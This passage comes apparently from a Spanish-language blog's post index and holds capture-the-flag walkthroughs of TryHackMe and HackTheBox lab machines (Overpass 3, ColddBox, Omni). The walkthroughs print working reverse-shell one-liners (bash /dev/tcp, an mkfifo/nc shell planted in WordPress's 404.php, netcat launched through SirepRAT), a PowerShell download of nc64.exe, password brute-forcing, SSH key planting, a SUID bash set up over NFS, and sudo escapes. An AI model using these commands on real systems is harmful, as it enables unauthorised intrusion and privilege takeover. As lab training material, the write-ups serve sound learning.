(Decode).\n","description":"Chocolate Factory es una maquina de TryHackMe, obtuvimos acceso a un portal crackeando un contraseñas de un backup de shadow, ejecutamos una shell inversa y obtuvimos acceso por SSH con una clave privada. Escalamos privilegios utilizando Sudo junto con Vi y finalmente para obtener nuestra ultima flag utilizamos Python.","id":78,"section":"posts","tags":["Fernet","ftp","steghide","steganography","john"],"title":"TryHackMe - Chocolate Factory","uri":"https://sckull.github.io/posts/chocolatfactory/"},{"content":"\rOverpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.\nRoom Titulo Overpass 3 - Hosting Descripción You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security\u0026hellip; Puntos 190 Dificultad Media Maker NinjaJc01 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # Nmap 7.80 scan initiated Mon Jan 11 20:08:53 2021 as: nmap -p- --min-rate 1000 -o allPorts overpass.thm Nmap scan report for overpass.thm (10.10.61.206) Host is up (0.36s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Mon Jan 11 20:11:05 2021 -- 1 IP address (1 host up) scanned in 132.11 seconds # Nmap 7.80 scan initiated Mon Jan 11 20:11:31 2021 as: nmap -p 21,22,80 -sV -sC -o servicePorts overpass.thm Nmap scan report for overpass.thm (10.10.61.206) Host is up (0.31s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA) | 256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA) |_ 256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos)) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) |_http-title: Overpass Hosting Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 11 20:11:48 2021 -- 1 IP address (1 host up) scanned in 17.54 seconds HTTP Encontramos una pagina web en el puerto 80 donde vemos una descripcion de la \u0026ldquo;empresa\u0026rdquo; y de algunos posibles usuarios.\nRUSTBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 kali@kali:~/thm/overpass3$ /opt/rustbuster/rustbuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirb/common.txt -t 35 -e php,html,txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2021-01-11 20:14:34 GET\t403 Forbidden\thttp://overpass.thm/.html GET 200 OK http://overpass.thm/ GET 301 Moved Permanently http://overpass.thm/backups =\u0026gt; http://overpass.thm/backups/ GET 403 Forbidden http://overpass.thm/cgi-bin/ GET 403 Forbidden http://overpass.thm/cgi-bin/.html GET 200 OK http://overpass.thm/index.html GET 200 OK http://overpass.thm/index.html [00:02:33] ######################################## 18444/18444 ETA: 00:00:00 req/s: 120 [?] Ended at: 2021-01-11 20:17:08 Encontramos un directorio que contiene un archivo comprimido, este iñto,p tiene una clave y un archivo encriptado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 kali@kali:~/thm/overpass3$ wget http://overpass.thm/backups/backup.zip --2021-01-11 20:18:31-- http://overpass.thm/backups/backup.zip Resolving overpass.thm (overpass.thm)... 10.10.61.206 Connecting to overpass.thm (overpass.thm)|10.10.61.206|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 13353 (13K) [application/zip] Saving to: ‘backup.zip’ backup.zip 100%[========================================================================================================================================\u0026gt;] 13.04K 50.1KB/s in 0.3s 2021-01-11 20:18:32 (50.1 KB/s) - ‘backup.zip’ saved [13353/13353] kali@kali:~/thm/overpass3$ unzip backup.zip Archive: backup.zip extracting: CustomerDetails.xlsx.gpg inflating: priv.key kali@kali:~/thm/overpass3$ ls allPorts backup.zip CustomerDetails.xlsx.gpg priv.key servicePorts kali@kali:~/thm/overpass3$ cat priv.key -----BEGIN PGP PRIVATE KEY BLOCK----- lQOYBF+oX7cBCADhibQ/m0CUX0DKreNOMaBiG6YNrkaRd5XKFfZ8cO+JbE57Yuao T3uhxN396ICsRBG7VGK03YZVwafMFxx0ItIEuV8n9nQ9K6WJg6od815J3UkkSMU4 TL6E+iGiAvYUtxwo2s/NqAdrUcAqoa9ImUxqHjJByNNpLbTcfKJKzZZEdVH6Iuo7 qLoKwNJLK427CpDqTFJmOLoRVH9XDSMaVaP5MT4qn18/iSJGpFJY/Qjv2RdgygiS [... SNIP ...] Aj7qgO6j7r2GkMwPiVlXQRW/dnhtNzvaS1ZR47R7YeFQuIIFiWnt+mamWrM3TN8x 5yeHVycXbFyRO121lKB0/q7f9dVFN8UY92F5cfMPUAOjM59P8Nsx3rFLUAhi7Fyo 5YeN91WwbAtRyc33YmwK/SpOVarOOdEvrGFK2z1Tq++RpqzuYFfnZ868NXJP+99Q wR1fzkFAFjEZIO+bteZLEzr9BCUI7FAyQofXMggwiuyuw/Prcema52nhJvA= =mr8q -----END PGP PRIVATE KEY BLOCK----- kali@kali:~/thm/overpass3$ Importamos la clave y desencriptamos el archivo, este ultimo contiene Nombres, usuarios, contraseñas e informacion de tarjetas de \u0026ldquo;credito\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kali@kali:~/thm/overpass3$ gpg --import priv.key gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key C9AE71AB3180BC08: public key \u0026#34;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026#34; imported gpg: key C9AE71AB3180BC08: secret key imported gpg: Total number processed: 1 gpg: imported: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 kali@kali:~/thm/overpass3$ gpg -d CustomerDetails.xlsx.gpg \u0026gt; file.xlsx gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08 \u0026#34;Paradox \u0026lt;paradox@overpass.thm\u0026gt;\u0026#34; kali@kali:~/thm/overpass3$ file file.xlsx file.xlsx: Microsoft Excel 2007+ kali@kali:~/thm/overpass3$ FTP Con las credenciales que encontramos intentamos ingresar por el servicio FTP donde logramos ver los archivos de la pagina y comprobar que tenemos permisos (con el primer usuario) de escritura, es por ello que comprobamos que el archivo shinji.php se muestra en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 kali@kali:~/thm/overpass3$ ftp overpass.thm Connected to overpass.thm. 220 (vsFTPd 3.0.3) Name (overpass.thm:kali): [SPOILER] 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 3 48 48 94 Nov 17 23:54 . drwxrwxrwx 3 48 48 94 Nov 17 23:54 .. drwxr-xr-x 2 48 48 24 Nov 08 21:25 backups -rw-r--r-- 1 0 0 65591 Nov 17 20:42 hallway.jpg -rw-r--r-- 1 0 0 1770 Nov 17 20:42 index.html -rw-r--r-- 1 0 0 576 Nov 17 20:42 main.css -rw-r--r-- 1 0 0 2511 Nov 17 20:42 overpass.svg 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; cd backups 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 48 48 24 Nov 08 21:25 . drwxrwxrwx 3 48 48 94 Nov 17 23:54 .. -rw-r--r-- 1 48 48 13353 Nov 08 21:24 backup.zip 226 Directory send OK. ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; put shinji.php local: shinji.php remote: shinji.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 25 bytes sent in 0.00 secs (305.1758 kB/s) ftp\u0026gt; APACHE - USER Subimos una shell inversa (ya que el servicio SSH no nos permitió ingresar), la \u0026ldquo;ejecutamos\u0026rdquo; y logramos obtener una shell con el usuario Apache y nuestra flag web.flag.\n1 2 3 \u0026lt;?php exec(\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34;); ?\u0026gt; PARADOX - USER Utilizando la contraseña de paradox logramos obtener una shell con este utilizando su, pero al parecer la consola esta \u0026ldquo;limitada\u0026rdquo; por lo que agregamos nuestra clave publica al archivo authorized_keys para poder ingresar por el servicio SSH y obtener una shell más comoda.\n1 2 3 4 5 6 7 8 9 10 11 12 pwd /home/paradox/.ssh ls -lah total 8.0K drwx------ 2 paradox paradox 47 Nov 18 18:32 . drwx------. 4 paradox paradox 203 Nov 18 18:29 .. -rw------- 1 paradox paradox 583 Nov 18 18:29 authorized_keys -rw-r--r-- 1 paradox paradox 583 Nov 18 18:29 id_rsa.pub echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAAD[... snip ...]EA8NHz17TjX/NsxObr9Q6ziiRgIc= kali@kali\u0026#34; \u0026gt;\u0026gt; authorized_keys tail authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB[... snip ...]8NHz17TjX/NsxObr9Q6ziiRgIc= kali@kali JAMES NFS - USER Enumeramos la maquina y encontramos puertos locales que no aparecen abiertos en nmap o aparecen filtrados, puertos que pertenecen RPC (111), NFS (2049) y MOUNTD (20048), al revisar si existia un punto de acceso encontramos la carpeta principal de James: /home/james, y que, cualquiera tiene acceso. Pero existe un problema, estos puertos solo estan disponibles de manera local y para montar este punto de acceso es necesario privilegios root, es por eso que debemos de llevar estos puertos a nuestra maquina para poder montar el punto de acceso, poder listar y montarlo tal cual como lo muestra showmount -e dentro de la maquina (/home/james). Para ello utilizamos chisel (ya que SSH no me permitia obtener el puerto 111) y SSH.\n1 2 3 4 5 6 7 8 #CHISEL en Overpass ./chisel client 10.2.29.162:8080 R:111:127.0.0.1:111 #Chisel en nuestra maquina ./chisel server -p 8080 --reverse #SSH en nuestra maquina ssh -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 paradox@overpass.thm En caso de que nuestra maquina no acepte el puerto 111 hay que parar el servicio rpcbind\n1 2 systemctl stop rpcbind systemctl stop rpcbind.socket Revisamos que los puertos estan localmente y que existe el punto de acceso con showmount.\nCreamos una carpeta, montamos el punto de acceso con mount.\n1 2 3 4 5 #Creamos una carpeta mkdir jamesstuff #MOUNT sudo mount -o nolock -t nfs localhost:/home/james /home/kali/thm/overpass3/jamesstuff/ Logramos obtener acceso a los archivos de James, nuestra flag user.txt y su clave privada de SSH la cual utilizamos para obtener una shell con este usuario.\nPRIVILEGE ESCALATION Ya que tenemos acceso a la carpeta de James a traves de NFS vamos a copiar bash con permisos root o SUID.\n1 2 cp /bin/bash . chmod +s bash Ya que tenemos acceso a la maquina con el usuario James ejecutamos bash -p para obtener una shell con el usuario root y nuestra flag root.txt.\nNFS - UPDATE No era necesario obtener el puerto 111 y 20048, solo el puerto 2049 y montar directamente localhost:/ a la carpeta especificada.\n1 2 3 4 5 #SSH - Puerto 2049 ssh -L 2049:127.0.0.1:2049 paradox@overpass.thm #Mount sudo mount -t nfs localhost:/ /home/kali/thm/overpass3/jamesstuff/ Links útiles:\nLinux Privilege Escalation using Misconfigured NFS NFS access ","description":"Overpass 3 - Hosting es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y enumeracion para obtener acceso y credenciales para acceder al siguiente usuario. Se obtuvo el puerto NFS localmente donde obtuvimos la clave privada para SSH de otro usuario. Finalmente escalamos privilegios con Bash.","id":79,"section":"posts","tags":["nfs","rpc","rustbuster","ftp","chisel","mount"],"title":"TryHackMe - Overpass 3 - Hosting","uri":"https://sckull.github.io/posts/overpass3/"},{"content":"\rColddBox: Easy es una maquina de TryHackMe, realizamos un ataque de contraseñas en WordPress con usuariois encontrados en WPScan, lo que nos dio acceso a la maquina. Realizamos movimiento lateral con credenciales encontradas en archivo de configuracion de WordPress. Para escalar privilegios encontramos multiples opciones.\nRoom Titulo ColddBox: Easy Descripción An easy level machine with multiple ways to escalate privileges. Puntos 60 Dificultad Facil Maker C0ldd NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto 4512 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.80 scan initiated Mon Jan 11 02:28:35 2021 as: nmap -p- --min-rate 1000 -o allports cold.thm Warning: 10.10.77.71 giving up on port because retransmission cap hit (10). Nmap scan report for cold.thm (10.10.77.71) Host is up (0.34s latency). Not shown: 65026 closed ports, 507 filtered ports PORT STATE SERVICE 80/tcp open http 4512/tcp open unknown # Nmap done at Mon Jan 11 02:31:05 2021 -- 1 IP address (1 host up) scanned in 149.46 seconds # Nmap 7.80 scan initiated Mon Jan 11 02:42:32 2021 as: nmap -sV -sC -p80,4512 -o servicePorts cold.thm Nmap scan report for cold.thm (10.10.77.71) Host is up (0.31s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.1.31 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: ColddBox | One more machine 4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA) | 256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA) |_ 256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jan 11 02:42:50 2021 -- 1 IP address (1 host up) scanned in 18.69 seconds El puerto 4512 esta corriendo el servicio SSH lo comprobamos utilizando netcat.\n1 2 3 4 kali@kali:~/thm/colddbox$ nc cold.thm 4512 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10 ^C kali@kali:~/thm/colddbox$ HTTP Encontramos una pagina en el puerto 80 que a simple vista podemos ver que es WordPress, ejecutamos wpscan, logramos obtener algunos nombres de usuarios y la version de WordPress:4.1.31 .\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [... snip ...] [i] User(s) Identified: [+] the cold in person | Found By: Rss Generator (Passive Detection) [+] c0ldd | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] hugo | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] philip | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [... snip ...] GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 kali@kali:~/thm/colddbox$ gobuster dir -u http://cold.thm/ -w /usr/share/wordlists/dirb/big.txt -q -t 35 -x php,html,txt /hidden (Status: 301) /index.php (Status: 301) /license.txt (Status: 200) /readme.html (Status: 200) /server-status (Status: 403) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-config.php (Status: 200) /wp-includes (Status: 301) /wp-login.php (Status: 200) /wp-trackback.php (Status: 200) /xmlrpc.php (Status: 200) WWW-DATA - USER En el resultado de GOBUSTER vemos una pagina que contiene un mensaje donde indica que C0ldd cambio la contraseña de hugo y que no puede editar articulos en la pagina. Realizamos una busqueda de directorios y paginas en esta ultima direccion pero no obtuvimos resultados, por lo que realizamos un ataque de fuerza bruta con hydra al panel de wordpress con los usuarios encontrados.\nLogramos obtener una contraseña de uno de los usuarios, mismo usuario que tiene permisos de administrador, editamos el archivo 404.php para ejecutar una shell inversa.\n1 exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#39;); \u0026ldquo;Ejecutamos\u0026rdquo; nuestra shell generando un \u0026ldquo;error\u0026rdquo; en la pagina, en mi caso cambiando el numero de Post a 2 en la URL para generar un error, logrando obtener una shell con el usuario www-data.\nC0LDD - USER Dentro de la maquina realizamos una enumeracion y logramos encontrar usuario y contraseña de la base de datos de WordPress, dicho usuario está registrado en la maquina por lo que intentamos utilizar esta contraseña y logramos obtener una shell con este usuario y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;[REDACTED]\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vim, chmod, ftp. Utilizamos GTFOBins para obtener una shell root. Es posible obtener una shell con los 3 comandos disponibles.\nVim Chmod Ftp 1 2 3 4 5 6 7 8 9 #VIM sudo vim -c \u0026#39;:!/bin/sh\u0026#39; #CHMOD sudo chmod u+s /bin/bash #FTP sudo ftp !/bin/sh ","description":"ColddBox: Easy es una maquina de TryHackMe, realizamos un ataque de contraseñas en WordPress con usuariois encontrados en WPScan, lo que nos dio acceso a la maquina. Realizamos movimiento lateral con credenciales encontradas en archivo de configuracion de WordPress. Para escalar privilegios encontramos multiples opciones.","id":80,"section":"posts","tags":["wordpress","hydra","wpscan","sudo privesc"],"title":"TryHackMe - ColddBox: Easy","uri":"https://sckull.github.io/posts/coldd/"},{"content":"\rOmni es una maquina de HackTheBox diferente ya que encontramos un SO Windows IOT, descubrimos que existe una vulnerabilidad la cual aprovechamso para ejecutar una shell inversa. Enumerando diferentes archivos encontramos credenciales almacenadas que nos permitieron ingresar al Portal y obtener acceso privilegiado.\nInformacion de la Maquina Nombre Omni OS Other Puntos 20 Dificultad Facil IP 10.10.10.204 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.3, 5.6, 5.8, 4.2, 4.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # Nmap 7.80 scan initiated Sat Sep 12 16:50:46 2020 as: nmap -Pn -p- --min-rate 1000 -o allports omni.htb Nmap scan report for omni.htb (10.10.10.204) Host is up (0.15s latency). Not shown: 65529 filtered ports PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown # Nmap done at Sat Sep 12 16:54:03 2020 -- 1 IP address (1 host up) scanned in 197.08 seconds # Nmap 7.80 scan initiated Sat Sep 12 16:54:52 2020 as: nmap -Pn -sV -sC -p 135,5985,8080,29817,29819,29820 -o servicesport omni.htb Nmap scan report for omni.htb (10.10.10.204) Host is up (0.066s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn\u0026#39;t have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.80%I=7%D=9/12%Time=5F5D35A3%P=x86_64-pc-linux-gnu%r(N SF:ULL,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(GenericLines,10,\u0026#34; SF:\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(Help,10,\u0026#34;\\*LY\\xa5\\xfb`\\x0 SF:4G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(JavaRMI,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\x SF:c9}\\xc8O\\x12\u0026#34;); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 12 16:56:07 2020 -- 1 IP address (1 host up) scanned in 74.96 seconds HTTP 8080 Encontramos una pagina que pregunta por credenciales y muestra el mensaje Windows Device Portal.\nSIREPRAT Investigamos acerca de este \u0026ldquo;Portal\u0026rdquo; y encontramos que es un portal para dispositivos IoT. Encontramos una herramienta con la cual es posible realizar ejecucion de comandos en la maquina: SirepRAT.\nEn caso de error instalar:\n1 pip install enum34 Ejecutamos esta herramienta para obtener el archivo hosts de windows, el cual logramos obtener.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path \u0026#34;C:\\Windows\\System32\\drivers\\etc\\hosts\u0026#34; --v --------- # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. #\t127.0.0.1 localhost #\t::1 localhost --------- \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; \u0026lt;FileResult | type: 31, payload length: 824, payload peek: \u0026#39;# Copyright (c) 1993-2009 Microsoft Corp.## Th\u0026#39;\u0026gt; Ahora que tenemos acceso vamos a ejecutar una shell inversa con netcat, primero descargamos netcat aunque la version que tiene Kali no funcionó en la maquina por lo que descargamos la version de 64 bits.\n1 2 3 4 kali@kali:~/tools/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c \\\\10.10.14.44\\TMP\\nc.exe -e C:\\Windows\\System32\\cmd.exe 10.10.14.44 1338\u0026#39; \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; \u0026lt;OutputStreamResult | type: 11, payload length: 295, payload peek: \u0026#39;You can\u0026#39;t connect to the file share because it\u0026#39;s n\u0026#39;\u0026gt; \u0026lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: \u0026#39;\u0026#39;\u0026gt; Descargamos, ponemos a la escucha netcat, ejecutamos nuestra shell inversa y logramos obtener una shell con el usuario DefaultAccount pero si no le pasamos el parametro --as_logged_on_user obtenemos una shell con usuario omni$.\n1 2 3 4 5 #Descarga de netcat python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c powershell -c \u0026#34;\u0026amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\\Data\\Users\\DefaultAccount\\nc64.exe }\u0026#34;\u0026#39; #Ejecutar shell inversa python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#39; /c powershell -c C:\\Data\\Users\\DefaultAccount\\nc64.exe -e cmd.exe 10.10.14.44 443\u0026#39; Tenemos acceso a los directorios de los usuarios y encontramos la flag user.txt y root.txt con el usuario omni$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 C:\\Data\\Users\u0026gt;dir app dir app Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\\Data\\Users\\app 07/04/2020 09:53 PM \u0026lt;DIR\u0026gt; . 07/04/2020 09:53 PM \u0026lt;DIR\u0026gt; .. 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; 3D Objects 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Documents 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Downloads 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Favorites 07/04/2020 08:20 PM 344 hardening.txt 07/04/2020 08:14 PM 1,858 iot-admin.xml 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Music 07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Pictures 07/04/2020 09:53 PM 1,958 user.txt 